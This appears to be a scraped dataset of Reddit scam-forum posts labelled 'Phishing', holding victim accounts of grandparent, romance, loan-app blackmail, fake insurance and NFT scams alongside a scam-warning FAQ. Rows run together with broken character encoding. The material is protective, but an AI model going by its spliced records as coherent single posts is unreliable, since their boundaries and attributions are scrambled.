Then sometime in July, I got another message from the young lady. She asked to discuss coordinates to a random field in my county. Once again, I just deleted it without interacting with her. Maybe she typed in the number wrong and me and this Harold guy have a similar phone numbers.

But then, this morning, she texted me again. And she seemed really pissed that I have been ignoring her messages. For some reason, her message ended with ‚ÄúReply NOTHX to unsubscribe.‚Äù Before, I was kinda tempted to tell her she was messaging a 14yo girl and not Harold who possibly wanted to discuss the countryside, but now I‚Äôm kinda skeptical.

1597778115.0,"Apparently I'm in jail in Dade county, and my grandparents have to pay $13,750.00 to help me TODAY","My grandparents just called me to see if I'd answer, and ask me if I'm ok. Which is strange. Yes, I'm fine, working from home, why? 

They explained they just received a call from a girl who was crying and she sounded just like me. She called them Grandma and Grandpa, and she explained that her friend Amanda died in a car accident yesterday, so she and a friend flew to Miami for the funeral. She booked an Uber, she and her friend put their suitcases in the trunk, and they left the airport. Then they were pulled over by the cops, who searched the trunk and going 2lbs of marijuana. The driver said ""it's not mine, everything in the trunk is theirs"". Which is how the scammer pretending to be me ended up in jail in Miami, and she needs $13,750.00 in cash delivered to a local bail bondsman so that he can send it to her lawyer so that they can pay an ""appearance fee"" in front of a judge, otherwise the scammer will spend the next 6-8 weeks in jail waiting for a hearing. 

They said the girl who was pretending to be me transferred the call to her lawyer, who explained the breakdown of the fees and how a local bail bondsman can facilitate the transaction. My grandparents own a couple of businesses, so they asked the lawyer to fax them a copy of my arrest report, and his contract, and at that point he explained how urgent the matter was, etc etc and ultimately hung up. 

My grandparents debated whether or not it could possibly be factual because the girl ""sounded so much like you!"" They called my mom to see if this sounded familiar at all (do I have a friend named Amanda? Do I know anyone in Florida? Did I tell her to watch my pigs while I go out of state? Etc).

1697237798.0,Pretty sure I'm being scammed?," So,  this whole thing started last Sunday when a company tried to take a  very large amount of money out of my account. I was alerted by chase  fraud, I cancelled my card right away & now I'm waiting for a new  one.

Not sure how or when this  company or people got my information, but I've noticed around September  18th, last month, I started getting these ""Non-Chase ATM Fees"" Just from  the 18th of last month, to today, I have been charged a total of $45 in  these fees. They're each $3. I called customer service and the guy told  me they are fees that happen when you withdraw or inquire at a  non-chase ATM. The thing is, I only go to the ATM once a month, at the  beginning of the month to pull out cash to pay my bills. Other than  that, I never touch an ATM. But somehow I'm getting these fees every  couple of days. Even 4 in one day. Sadly I'm not being alerted when  these fees happen. I have alerts on for every purchase I make and I  don't get notified from the app when these happen. Since I've cancelled  my card last Sunday, I've received 2 more of these fees just 3 days ago,  on the same day. I noticed when I am charged a legit ATM fee, it says  ""Non-Chase ATM Fee-WITH"" meaning withdraw. But all of these new ones  since September 18th say ""Non-Chase ATM Fee-INQ"" meaning inquiry.

After  looking deeper into my purchases, I just noticed theres a pattern.  These fees seem to happen when I go to my local taco bell, 7/11, and  Chevron. And the 4 fees I had in one day, I believe might be connected  to the vending machine I used at the courthouse when I had jury duty. I  bought 1 drink for $2.65 but I was charged 3 additional times (4 total)  for that one drink, and I had those 4 fees pop up in that same day.

Is  this possibly the work of skimmers? But if so, how would this be linked  to an ATM? And how can I avoid this but still go to the places close to  my house?

&#x200B;

TLDR; I keep getting Non-Chase ATM Fees for inquiry even though I NEVER go to the ATM to check my balance. I go to the ATM once a month to pull out money for my bills. I notice it happens when I go to my local taco bell, 7/11, and Chevron. Is this the work of card skimmers?",Phishing,2183,428,63,1

 Partial transcript:

**A blackmail scam is using instant loan apps to entrap and humiliate people across India and other countries in Asia, Africa, and Latin America. At least 60 Indians have killed themselves after being abused and threatened. A‚Äã BBC undercover investigation has exposed those profiting from this deadly scam in India and China.**

Astha Sinhaa woke up to her aunt's panicked voice on the phone. ""Don't let your mother leave the house.""

Half-asleep, the 17-year-old was terrified to find her mum Bhoomi Sinhaa in the next room, sobbing and frantic.

Here was her funny and fearless mother, a respected Mumbai-based property lawyer, a widow raising her daughter alone, reduced to a frenzied mess.

""She was breaking apart,"" Astha says. A panicked Bhoomi started telling her where all the important documents and contacts were, and seemed desperate to get out of the door.

Astha knew she had to stop her. ""Don't let her out of your sight,"" her aunt had told her. ""Because she will end her life.""

 

Astha knew her mother had been getting some weird calls and that she owed somebody money, but she had no idea that Bhoomi was reeling from months of harassment and psychological torture.

She had fallen victim to a global scam with tentacles in at least 14 countries that uses shame and blackmail to make a profit - destroying lives in the process.

The business model is brutal but simple.

There are many apps that promise hassle-free loans in minutes. Not all of them are predatory. But many - once downloaded - harvest your contacts, photos and ID cards, and use that information later to extort you.

When customers don't repay on time - and sometimes even when they do - they share this information with a call centre where young agents of the gig economy, armed with laptops and phones are trained to harass and humiliate people into repayment.

 

At the end of 2021, Bhoomi had borrowed about 47,000 rupees ($565; ¬£463) from several loan apps while she waited for some work expenses to come through. The money arrived almost immediately but with a big chunk deducted in charges. Seven days later she was due to repay but her expenses still hadn't been paid, so she borrowed from another app and then another. The debt and interest spiralled until she owed about two million rupees ($24,000; ¬£19,655).

Soon the recovery agents started calling. They quickly turned nasty, slamming Bhoomi with insults and abuse. Even when she had paid, they claimed she was lying. They called up to 200 times a day. They knew where she lived, they said, and sent her pictures of a dead body as a warning.

As the abuse escalated they threatened to message all of the 486 contacts in her phone telling them she was a thief and a whore. When they threatened to tarnish her daughter's reputation too, Bhoomi could no longer sleep.

She borrowed from friends, family and more and more apps - 69 in total. At night, she prayed the morning would never come. But without fail at 07:00, her phone would start pinging and buzzing incessantly.

Eventually, Bhoomi had managed to pay back all of the money, but one app in particular - Asan Loan - wouldn't stop calling. Exhausted, she couldn't concentrate at work and started having panic attacks.

One day a colleague called her over to his desk and showed her something on his phone - a naked, pornographic picture of her.

The photo had been crudely photoshopped, Bhoomi's head stuck on someone else's body, but it filled her with disgust and shame. She collapsed by her colleague's desk. It had been sent by Asan Loan to every contact in her phone book. That was when Bhoomi thought of killing herself.

We've seen evidence of scams like this run by various companies all over the world. But in India alone, the BBC has found at least 60 people have killed themselves after being harassed by loan apps.

Most were in their 20s and 30s - a fireman, an award-winning musician, a young mum and dad leaving behind their three- and five-year-old daughters, a grandfather and grandson who got involved in loan apps together. Four were just teenagers.

Most victims are too ashamed to speak about the scam, and the perpetrators have remained, for the most part, anonymous and invisible. After looking for an insider for months, the BBC managed to track down a young man who had worked as a debt recovery agent for call centres working for multiple loan apps.

 

Rohan - not his real name - told us he had been troubled by the abuse he had witnessed. Many customers cried, some threatened to kill themselves, he said. ""It would haunt me all night."" He agreed to help the BBC expose the scam.

He applied for a job in two different call centres - Majesty Legal Services and Callflex Corporation - and spent weeks filming undercover.

His videos captured young agents harassing clients. ""Behave or I will smash you,"" one woman says, swearing. She accuses the customer of incest and, when he hangs up, she starts laughing. Another suggests the client should prostitute his mother to repay the loan.

Rohan recorded over 100 incidents of harassment and abuse, capturing this systematic extortion on camera for the first time.

The worst abuse he witnessed took place at Callflex Corporation, just outside Delhi. Here, agents routinely used obscene language to humiliate and threaten customers. These were not rogue agents going off-script - they were supervised and directed by managers at the call centre, including one called Vishal Chaurasia.

Rohan gained Chaurasia's trust, and together with a journalist posing as an investor, arranged a meeting at which they asked him to explain exactly how the scam works.",Phishing,6067,1023,151,1

1685340921.0,This person scammed my mom. Is it possible he‚Äôs tracking her phone and should I be concerned for my safety?,"Back Story: My mom fell for a scam off Facebook. She‚Äôs elderly and was going through a hard period of losing two siblings within 6 months. For months this person convinced her he needed help and she feels very validated helping people so she did it. She lost about $8k but the scammer got more from her that he ‚Äúpaid back‚Äù by paying off her credit card.

Pretty sure he‚Äôs from Nigeria. (The Facebook page they run said managed in Nigeria lol.)

Now: This ended six months ago but I recently found out he somehow was contacting her again. So I went through my moms phone with her and blocked their contact and all the apps they could contact her from. (Google Chat, Facebook, and email).

The scammer knew it was me that ruined his game and sent me the attached message. (He found me on MERCARI of all places??)

Obviously the message was very startling. Should I be worried about my safety? It‚Äôs pretty easy to find info about me online.

My mom gave me her phone to delete apps, change her Apple ID, delete her FB account, and change her phone number. I live 2 hours away so I ended up having her phone for over a week. In that time she didn‚Äôt have any messages from the scammer.

TODAY like minutes after she gets home from picking up her phone from my house, she gets a text from them. Is that just an insane coincidence? Could they be tracking her and knew she was home? How did they get her new number?

Customer comes to you to buy many Steam/iTunes/google play or other gift cards. There are so many scams that the scammer has the person buy gift cards.

Ask: Why are you buying these cards? What are they going to do with them when they get them? How do you know [person]? When is the last time you saw [person] face to face?

If they have only talked via Facebook, if they haven‚Äôt talked to [person] face to face in many years, if they say they are buying a puppy online... etc deny the sale. Also, it never hurts to ask a peer or supervisor for help. Sometimes just asking for a second opinion will stop the transaction.

Scam 2:
Customer comes to purchase a prepaid gift card or debit card. They want to load $500 onto the card and say they have a ‚Äúcash card‚Äù for payment and walk you through the steps on how to use said ‚Äúcash card.‚Äù Customer typically will try to reach over your register and try to complete the transaction as if they paid cash. Be vigilant during card loads and call for backup when you feel uncomfortable.

Scam 3:
Customer buys a pack of gum or something similar with large bills. They will pull out many bills and ask you to break them and/or will say they were given the wrong change. They will be very polite and talk very fast. They may lay out bills on the counter to further confuse you. They will have you swap bills with them until you are hundreds short. This is called a quick change scam.

The only way to prevent this scam is to close your drawer immediately after every transaction. Refuse to reopen it without a peer or supervisor present.

He said that they would mostly be doing sign holding. A few commenters have said that sign holders do make pretty damn good money on a seasonal basis. 

‚ÄúAs for the job, yeah sounds iffy. Although after the 2017 hurricane, you would see only females directing traffic for subcontractors working on the road.

On top of that, he said all expenses would be paid for while they are down there. He also said they specifically needed females. Which is another huge red flag. He will not provide detailed information about what they would be doing, and said they would need to leave within a days notice of the company telling them to get on a plane.

EDIT UPDATE 5/13: I've since accessed my old Tesla app since i not longer own a Tesla and deleted my profile on the car. I haven't responded to him but he emailed me again tonight repeating the same information however he included he's the son of a former Government minister and he needs me in order to activate Premium Connectivity. I really don't see how any of that matters/has anything to do with me. I think i've done my part here unless anyone else has further advice? I plan on blocking the email and i suppose i wish him well if he truly has the car!",Phishing,1134,217,23,1

1697321056.0,Christmas Time Scams Online,"It happens every year now. I thought it was my bad decision making when I would purchase from a seller from a online auction who never shipped the item. I  had to wait to get my money back. Sometimes that wait could be 3 plus weeks long  at a time that I needed my money for the Holiday season. 

Now I am seeing that it has become a regular scam mostly right before the month of Thanksgiving or Christmas.

Crooked sellers will list desirable items for sale at good price with a extended shipping time frame and when they get a buyer and payment is made they never ship the item. Keep in mind the buyer  can not open a resolution case for a refund for not receiving the item until after the shipping time frame has passed.

 So if the seller has been given a 15 day time frame to ship/delivery of the item the buyer can not open a case with the auction site until after that time has passed. Once the case is open it takes about 7 days plus before the auction site will give back the money from the seller and several more days for the money to reach your bank account.  In all it could be a 30 day or more process at a time of year when you really need your money.

 How it this a scam?. The sellers usually gets paid your money right away for the item and uses it. With the intent on never sending the item. The seller can spend the money any way they wish without ever shipping the item. Who needs payday loans with auction polices like this.

 I know these companies are aware of what is happening but do nothing about it.

What can the companies do about it? Require the item be shipped with tracking before they release the payment to the seller and if the seller does not send the correct item hold them responsible for return shipping cost.  Or dont release payment until the item has been delivered. That would help.",Phishing,1826,348,21,1

There was a website the provided health insurance brokerage. I called the number and was assisted by a man who said his name was Alex T. He seemed very knowledgable and assisted me in picking a health insurance plan called ""First Health"" which was supposed to be owned by Aetna. I told them what I needed and I signed up for the insurance for $553.00, which was charged to my credit card. I felt good about my decision and received a membership card in the mail a couple of weeks later. Once I received the card, however, my heart sank. First of all, there were six different company logos on it: First Health Network, ABC + Advantage 3, Socios Buenos LP, Pro Act, HMA, and MutliPlan. Then, on the bottom of the card in small writing, it said ""Benefit Plans are not sold or insured by First Health or its associates."" I then spoke to the hospital financial services department where I was supposed to get surgery and they told me that the insurance I had purchased didn't have any of the benefits that I was promised and that I had was paying for basically no coverage. Upset, I called the broker up and was sent to a call center. I asked for the ""Alex"" who I had originally spoken to. I was transferred and, after recognizing his voice I asked him about the discrepancy between what was promised in the plan and the reality of the ""insurance"" I was given. He proceeded to tell me that his name was not Alex \*\*\*\*, but another Alex, and that Alex \*\*\*\* was his co-worker. I told him I wanted to speak to the other Alex. I was put on ""hold"" (no hold music) and out of frustration, I eventually hung up. I was called back by ""Alex"" and I told him I wanted to speak to Alex \*\*\*\*. I was transferred again to a man who also referred to himself as  the previous Alex. I asked him what the name of the previous person was and he said it was Jordan. I asked him what the name of the company they work for is. He told me it's called ""Stoic Insurance Group."" I looked up Stoic Insurance Group - but the link goes to various shell companies that sell fraudulent insurance. Luckily, I made the initial payment on my credit card and not my debit card and I immediately called my bank, changed my credit card number and disputed the initial charge - but there are plenty of stories online of people that have been scammed by ""Socios Buenos LP.""",Phishing,2459,462,62,1

1654271517.0,My MIL is sitting in a Nairobi hotel waiting for the swindler to marry her,"This is an update on a story I've shared earlier where my MIL met a man online and suddenly left to travel  to Kenya to meet him.

MIL did come back home temporarily. She refused to sign any power of attorney papers and the advice we received was that ""you can't stop someone from making poor choices"". Well basically we couldn't do anything legally.

We tried to talk her out of returning and make her see sense that she is being swindled. But the more we tried to stop her, the more distant she became. She pretty much cut everyone off. She keeps in touch with only one family member who placated her to ensure they could stay in touch. This person has provided me the info so I can give the update of what she is doing. 

So here's her story:

She did return to Kenya. But first she packed up all her  household furniture and sent that across to Kenya too.  7 weeks and it hasn't arrived yet. Nevermind, they say it will arrive soon. Hopefully they will have a house to put all the furniture into.  They will have to get a house soon. Once they are married!

The date is not set yet but she is excited. She is renting a room in Nairobi in the meanwhile. She spends most of her days passing the time looking at wedding dresses online. She is too scared to venture out of the hotel if he doesn't accompany her . Nairobi is a big place and she is 77. It's difficult to get around. When he is there, he makes her feel secure. He is the best man she's ever known. A good Christian and a hardworking 40 year old man. But unfortunately,  he is away a lot and she is on her own most of the time. So she doesn't get out much at all.  

He is head chef at one of the best hotels in Nairobi  and he is committed to the job. He needs to be there  24-7 many days of the week. Now he is employed again he might be able to  pay back the $130k he borrowed from her. He really got it as a loan, no wait, it was a gift. He needed it. It was for his jail bail- he was wrongly accused. He had long covid and the operations, the sick kids. It was lucky she gave him the money or he could have died. And it's lucky too his kids can now live with his sister. Really, thank god for the sister taking them or he wouldn't be able to work if he needed to look after kids.  Soon he won't need to work so much as they will invest in greenhouses. They will make back the  $130k she lent him in just one year!  Greenhouses is just one option as there are so many exciting investments to make!  Kenya has 7% interest rate so they are set to make money for sure. Soon. It will definitely happen soon. 

But she can't be impatient! For now, each day she is looking for her dream wedding dress online and it's  very exciting as she just got the news the wedding will be free and fully paid for at the big hotel where he works. It's going to be a big wedding full of his family and friends. Nevermind her own children won't go. They don't understand and were all skeptics! She'll show them!!! They will be married. And they will have a new house. And they will be making lots of money with their new investments. Soon. It will happen. Very soon.


:::::::::::::::::::::::::::::::::::::::

This man is a predator and conartist.  We estimate after the $130k she handed him she is at least down another $70k for logistics i.e. apartment rent, plane flights and who knows what else. If anyone has ideas on how I can expose him to warn other women let me know. MIL might not listen but maybe it could help others. I do know his name, DOB. But can't share here cause of admin rules.

1697088016.0,What happened here?,"Last week I received a text from my cellphone provider with a 6 digit number that I supposedly requested, in ""conversation"" with a 5 digit number. I then received a survey from my phone provider asking me to rate my experience with their customer service person whose name begins with a V on a scale from 1 to 5. Noting the time I received the 6 digit code on that day, I called my phone service provider to ask them what the hell this was about. I requested no 6 digit code from anyone, likewise I spoke to no CS rep named V. I happened to be sleeping when the 6 digit number came in and had not been on the phone or computer at that time. The rep I spoke with said that this was an attempt to hack or compromise my phone but my provider recognized it as such and prevented it. No further details provided, I just said OK and thanks. Of course it is rather absurd that they would also send me a survey about the customer service rep with the initial V who I never spoke to which of course I did not answer. My questions: has anything similar happened to anyone in this group? Could someone I know have attempted this or was it an unknown party? I did someone a favor and put him as an authorized user on my mobile phone account and he screwed me over on reimbursing me for his usage over the course of several months so I kicked him off the account. I thought maybe he was weaseling around trying to get service again at my expense but again it may have had nothing to do with him. He drifts around and I don't know his current whereabouts.

1581780892.0,I received a package I did not order from Amazon delivered to my house. Amazon told me to keep it. It was an iPhone 11.,"Last weekend I got email bombed, it was a nightmare. Thousands of spam emails for random websites and newsletters from all over the world started flooding in.

I immediately think I got hacked, and I was right. My paypal as well as my amazon accounts were compromised and someone had made purchases to the tune of about $3,000. I call Amazon, shut down my amazon account. I call my bank, cancel my bank card. Change all my passwords and set up 2 step verification. I filed fraud charges with paypal and my bank, and my money is returned to me by the end of the week.

Today, I received a package in the mail, addressed to me, and I have not made any orders since this incident. I open it up, and inside is a SimpleMobile iPhone 11 Pro 64gb. No packing slip, receipt or return address anywhere.

I call Amazon, tell them that back story, give them my email and the tracking code from the package and they tell me this order was purchased with my bank card that I canceled last weekend. I tell them the exact amount of one of the charges I got last week, and they say yes, that is this phone. The exact amount for this phone had already been refunded to my account.

The whole time the guy on the phone is just as confused as me. He keeps saying this sounds like a known scam technique and they will launch an internal investigation, but cannot notify me or give me a resolution. I ask him so what do I do with this phone? And the guy says ""you have no obligation to do anything with it, you can give it away or keep it, we will not accept the return"".

So now I'm stuck wondering to do with this really expensive phone I have no use for. I think it's locked to SimpleMobile so i don't think I can just put my sim card in.

TLDR: I was hacked and one of the orders from the hack arrived to my house a week later after I had already received a refund. Amazon told me to keep an iPhone 11 pro I did not pay for, and now I don't know what to do with it.

1697549528.0,That sudden realization moment,"I used to be quite big in the scambaiting community back in the mid-2000s and on toward the end of the 2010s. I mainly dealt with the West African 419ers, and became very knowledgable about all of their modalities and approaches, but I got burned out doing multiple baits (getting some cool trophies in my time), and also dipping my toe into victim support. In short, I reckoned I was quite good about spotting a scam.

However, go back a handful of days to the middle of last week and you will find me getting ensnared in what I now know is a scam dealing with creating NFTs, but only suspected it was such this morning when a moment clarity broke through and I started investigating the website, the user who initially contacted me, and other ways of checking out the legitimacy of whom I was dealing with.

The strange thing is... it never felt like a scam when I was sitting there converting my GBP to ETH and preparing to send it to the scammer's wallet. I was fully believing that, when the process was over, I would get a few extra ¬£s for the artworks I now create as a hobby and pastime. I suspect it was because I was not sending my GBP directly (in the form of Western Union or Moneygram orders, in the case of what the WA scammers would insist a victim use) and instead it was this rather unfamiliar ETH thing. I guess that second level of converting my GBP into something rather ephemeral and insubstantial helped, I now believe, to remove the idea that I was dealing with money I would never see again. The intermediary level between me and my bank account lessened the impact at the time.

So yeah... I'm now sitting here just shaking my head and rethinking the email conversations I had with the initial roper who pulled me into the thing, wondering which clues I should have spotted much earlier. Sure, looking back now, I can spot a few hints here and there that I should have probed further, but at the time, because that extra level of dealing with cryptocurrency rather than hard, solid cash, or even figures in my actual bank account, it helped blind me to what was taking place.

Just writing this out, I can feel a little better and less angry. Angry at the scammers and angry at myself.

So yeah... if anyone approaches you, through whatever means, and asks if you would like to make some of your digital creations into NFTs and they will then buy them from you... stop and check them out before going any further. And remember... underneath the shine and glamour of fancy new technologies, cryptocurrency still requires actual currency from your bank account in most cases if you want to use it for anything.

I'm still a little bit annoyed and angry, though...

&#x200B;

EDIT TO ADD: I still have them believing I'm a credible victim (well... I was! But you know what I mean, right?) and I haven't burned them yet but have come close just to vent that anger I'm feeling.

Many summers ago these two kids knocked on my door. They had a bucket, some sponges and car shampoo with them. The older one (about 12), explained they were raising money so they could go on a school trip to America by washing cars. The car in my driveway wasn't mine, but my housrmates, so I called him down to ask. We agreed to split the ¬£5 it would cost between us, not because the car needed cleaning, but because we'd done similar odd-jobs around the neighborhood when we were their age, and it was only ¬£5. So we gave him the money.

The older boy asked if we could fill the bucket from the tap. We went to the kitchen sink in the back of the house and returned to find only the older boy there - the younger one had disappeared.

The boy explained that his friend had started crying and ran off (in the minute it took to fill tr bucket), and that he should go after him - ""Ill be right back"" he promised as he jetted off up the street.

As we closed the the door, my housemate and I turned to each other and said ""No he won't"" with a wry chuckle.

I paid 140usd to the dealer through PayPal(friends and family). The next day he gave me a link to the package tracking website and a tracking number. 

Soon I get three calls and a message via text (1st photo). I responded asking how to pay‚Äìassuming it would be through the website. He sent me a PayPal address and told me to send through family and friends and send a screen shot that I‚Äôve sent it. I was suspicious but did so anyway after he was calling and texting how he was waiting on payment and ‚Äútime is running‚Äù. 

The next morning I receive the following message (2nd&3rd photo). 

I (exasperatedly) ask if it‚Äôs the same PayPal account and proceed to receive a new PayPal address for which the receiving end is in PLN? (I was confused as I was to believe this whole tracking website is American, why am I paying PLN?) 

He is pressuring me to send the money‚Ä¶ That time was running‚Äìcalling me several times, messaging me ‚Äú??‚Äù And ‚Äúhello sir.‚Äù Over and over. I told him I was at work and that I would do it on break. He didn‚Äôt like that answer and said it was urgent I do it then. 
(My card was declining sending the money so I made a new PayPal acc and used a different card) 
I sent the money to a new American address because it didn‚Äôt work with the first PayPal acc/my card, and told him I would have to call to get it sorted; hence the new address. 

Today I received a message from him with the tracking website I was sent previously and my tracking number. He told me to track the package. I went on the website to track and was faced with another money ask. (See photo 4)

I told him I received the tracking number and all after he messaged me and called me a few times waiting on my response. I told him I had seen it and he followed up with (photo 5). 

At this point I‚Äôm almost 100% sure this is a scam and I‚Äôm not sending him any more money. When I sent the first message (photo 6) I got a call immediately from him and promptly after a message from the man I had bought it off of. He was asking if everything was cool now (I had told him the situation and he said 3 other of his buyers had the same issue but it was all resolved and i just had to ‚Äúbe cool and everything will be sorted out‚Äù). I did not respond to him. 

I sent the second text (seen in photo 6) and as you can see, received that response‚Ä¶ 

Today I have checked the legitness of the package tracking website and saw that it was made 8 months ago and had little traffic.

To me this seems to be in violation of rule three but it happens so often I don‚Äôt know if the mods are doing anything about this. 

People post in this sub looking for advice. Things that are obvious to somebody are not obvious to another. I‚Äôve learned so much by following this sub about scams I never would‚Äôve considered; like the overpayment for 3rd party shipping as an example.

Doesn‚Äôt this sub exist *to ask questions of the community for advice*?  So I don‚Äôt understand why people get so high and mighty in the answers implying the person is an idiot for even considering what they posted. It‚Äôs almost like trolls are flocking here. Anyone else feeling the same?

PS - I thought just came to me. FUCK scammers, right? We all agree on that?
If our behaviour in the comments turns OP off from posting in the future and commenters see what‚Äôs being written and that turns *them* from posting‚Ä¶I‚Äôd say its‚Äôs likely people are *not coming forward* to ask whether something is a scam and potentially ACTUALLY getting scammed.

## the (possible) scam?
as I'm waiting, she comes out and asks me to show my license and drive her car out. I was confused and she wasn't really communicating very clearly, so I wasnt sure why she couldn't drive it out, but I didn't sense any red flags so I did it.

Is there some kind of fraud (""it wasn't broken like this until you drove it!"") kind of thing I could be in danger of? or could there have been a reason she couldn't drive it out?

1697329298.0,Advice Please: Friend's family is being torn apart/possibly evicted over scamming,"Hey, I'm posting for a friend of mine who doesn't know what else to do. Their family is being torn apart over an active scam  (or worse) and may cause them to lose their home.

Her 70+ year old parents are the center of the problem. The dad is actively sending scammers money, totaling over $100k. This has gone on over an undetermined period. Essentially, he's claimed to have stopped but has actually kept sending them money and has stopped paying the family bills. They have no heat, internet and face a housing court hearing at the end of the month.

I'm trying to find some solutions for the mom as the dad seems so far down the rabbithole that he's convinced he isn't being scammed (or he's doing something more nefarious but I can't guarantee anything). In either case, she needs help and doesn't deserve this. But she's so out of the loop on the family finances that she's just watching the family funds bleed away as her husband gives money to these scammers.

Does anyone have any tips for them? So far we've tried legal aid (they live in the US) but they earn too much to qualify. We're looking into domestic abuse centers under financial and mental abuse claims. I've also floated the idea of her telling the judge everything at court but I fear that won't help her much. With the funds depleted, the mom can't afford a new place to rent or even file papers to divorce him.

Can anyone help? Any advice would be massively appreciated.

Went through a guy who was already suspicious, said he'd forward my resume to his employer, then after a day or two set up an interview. Interview's scheduled for Thursday.

The email I received with these instructions also had another address where the recruiter was supposedly located. Looked that place up and was full of reviews saying it was a scam company.

My question is, do I report this to the police? I'm definitely not going on Thursday, but should I be doing more to protect myself? Would I show up and just be given a letter to ""join"" and asked for my bank info and nothing worse? I'm a bit at a loss of what's the right thing here.

I asked the caller once to explain how it works. He said that his company works as a third party with various utility providers across North America, and receive commissions for bringing them new customers. Here‚Äôs the funny part - they get paid their commissions in the form of vouchers and gift cards that the company cannot use for anything other than making utility payments. So their offer is - ‚Äúlet us pay your bills. Confirm that your bill has been paid. Then pay us 60% of the billed amount.‚Äù

Their persistence is annoying, and my guess is that there‚Äôs a play to steal personal info or perhaps pay the bill using some fraudulent means that will end up failing to settle and return to me with fines after I have paid them the 60%.",Phishing,1064,198,13,1

**Blackmail email scam thread: https://www.reddit.com/r/Scams/comments/n00kg3/the_blackmail_email_scam_part_7/**

  

Some of these articles are from small, local publications and refer to the scam happening in a specific area. **Do not** think that this means that the scam won't happen in your area.


#Spoofing 

**[Caller ID spoofing](https://www.fcc.gov/consumers/guides/spoofing-and-caller-id)**  

It is very easy for anyone to make a phone call while having any number show up on the caller ID of the person receiving the phone call. Receiving a phone call from a certain number does not mean that the person/company who owns that number has actually called you.

**[Email spoofing](https://www.barracuda.com/glossary/email-spoofing)** 

The ""from"" field of an email can be set by the sender, meaning that you can receive scam emails that look like they are from legitimate addresses. It's important to never click links in emails unless absolutely necessary, for example a password reset link you requested or an account activation link for an account you created.

**[SMS spoofing](https://en.wikipedia.org/wiki/SMS_spoofing)**

SMS messages can be spoofed, so be wary of messages that seem to be from your friends or other trusted people.

#The most common scams

**[The fake check scam](https://www.consumer.ftc.gov/articles/0159-fake-checks)**   
(Credit to /u/nimble2 for this part)

The fake check scam arises from many different situations (for instance, you applied for a job, or you are selling something on a place like Craigslist, or someone wants to purchase goods or services from your business, or you were offered a job as a mystery shopper, you were asked to wrap your car with an advertisement, or you received a check in the mail for no reason), but the bottom line is always something like this:

* The scammer sends you a very real looking, but fake, check. Sometimes they'll call it a ""cashier's check"", a ""certified check"", or a ""verified check"".

* You deposit the check into your bank account, and within a couple of days your bank makes some or all of the funds available to you. This makes you think that the check is real and the funds have cleared. However, the money appearing in your account **is not** the same as the check actually clearing. The bank must make the funds available to you before they have cleared the check because that is the law. 
* For various and often complicated reasons, depending on the specific story line of the scam, the scammer will ask you to send someone some of the money, using services like MoneyGram, Western Union, and Walmart-2-Walmart. Sometimes the scammer will ask for you to purchase gift cards (iTunes, Amazon, Steam, etc) and give them the codes to redeem the gift cards. Some scammers may also give you instructions on how to buy and send them bitcoins. 

* Within a couple of weeks, though it can take as long as a month, your bank will realize that the check you deposited was fake, and your bank will remove the funds that you deposited into your account and charge you a bounced check fee. If you withdrew any of the money from the fake check, that money will be gone and you will owe that money to the bank. Some posters have even had their bank accounts closed and have been blocked from having another account for 5 years using ChexSystems.
   
   
**General fraudulent funds scams**   
If somebody is asking you to accept and send out money as a favour or as part of a job, it is a fraudulent funds scam. It does not matter how they pay you, any payment on any service can be fraudulent and will be reversed when it is discovered to be fraudulent. 


**[Phone verification code scams](https://computertutorflorida.com/2019/01/the-verification-code-scam/)**  
Someone will ask you to receive a verification text and then tell you to give them the code. Usually the code will come from Google Voice, or from Craigslist. In the Google version of the scam, your phone number will be used to verify a Google Voice account that the scammer will use to scam people with. In the Craigslist version of the scam, your phone number will be used to verify a Craigslist posting that the scammer will use to scam people.  There is also an account takeover version of this scam that will involve the scammer sending a password reset token to your phone number and asking you for it.


**Bitcoin job scams**   

Bitcoin job scams involve some sort of fraudulent funds transfer, usually a fake check although a fraudulent bank transfer can be used as well. The scammer will send you the fraudulent money and ask you to purchase bitcoins. This is a scam, and you will have zero recourse after you send the scammer bitcoins.    

**[Email flooding](https://krebsonsecurity.com/2012/07/cyberheist-smokescreen-email-phone-sms-floods/)** 
 
If you suddenly receive hundreds or thousands of spam emails, usually subscription confirmations, it's very likely that one of your online accounts has been taken over and is being used fraudulently. You should check any of your accounts that has a credit card linked to it, preferably from a computer other than the one you normally use. You should change all of your passwords to unique passwords and you should start using two factor authentication everywhere.  

**[Cartel scam](https://newyork.cbslocal.com/2019/08/13/scam-brooklyn-bloody-pics-cartel/)**

You will be threatened by scammers who claim to be affiliated with a cartel. They may send you gory pictures and threaten your life and the lives of your family. Usually the victim will have attempted to contact an escort prior to the scam, but sometimes the scammers target people randomly. If you are targeted by a cartel scam all you need to do is ignore the scammers as their threats are clearly empty. 


**[Boss/CEO scam](https://abc7chicago.com/finance/gift-card-scam-uses-bosses-email-addresses-when-phishing/4556080/)**  
A scammer will impersonate your boss or someone who works at your company and will ask you to run an errand for them, which will usually be purchasing gift cards and sending them the code. Once the scammer has the code, you have no recourse. 

**Employment certification scams**  

You will receive a job offer that is dependent on you completing a course or receiving a certification from a company the scammer tells you about. The scammer operates both websites and the job does not exist. 

**Craigslist fake payment scams**    

Scammers will ask you about your item that you have listed for sale on a site like Craigslist, and will ask to pay you via Paypal. They are scamming you, and the payment in most cases does not actually exist, the email you received was sent by the scammers. In cases where you have received a payment, the scammer can dispute the payment or the payment may be entirely fraudulent. The scammer will then either try to get you to send money to them using the fake funds that they did not send to you, or will ask you to ship the item, usually to a re-shipping facility or a parcel mule. 

**[Craigslist Carfax/vehicle history scam](https://www.consumer.ftc.gov/blog/2018/10/steering-clear-vehicle-history-report-scams)**

You'll encounter a scammer on Craigslist who wants to buy the vehicle you have listed, but they will ask for a VIN report from a random site that they have created and they will expect you to pay for it. 

**[Double dip/recovery scammers](https://www.consumer.ftc.gov/articles/0102-refund-and-recovery-scams)**

This is a scam aimed at people who have already fallen for a scam previously. Scammers will reach out to the victim and claim to be able to help the victim recover funds they lost in the scam. 

**General fraudulent funds scams**   
The fake check scam is not the only scam that involves accepting fraudulent/fake funds and purchasing items for scammers. If your job or opportunity involves accepting money and then using that money, it is almost certainly a frauduent funds scam. Even if the payment is through a bank transfer, Paypal, Venmo, Zelle, Interac e-Transfer, etc, it does not matter.    

**[Credit card debt scam](http://www.wndu.com/home/headlines/New-scam-offers-to-pay-off-credit-card-debt-276992911.html)**   

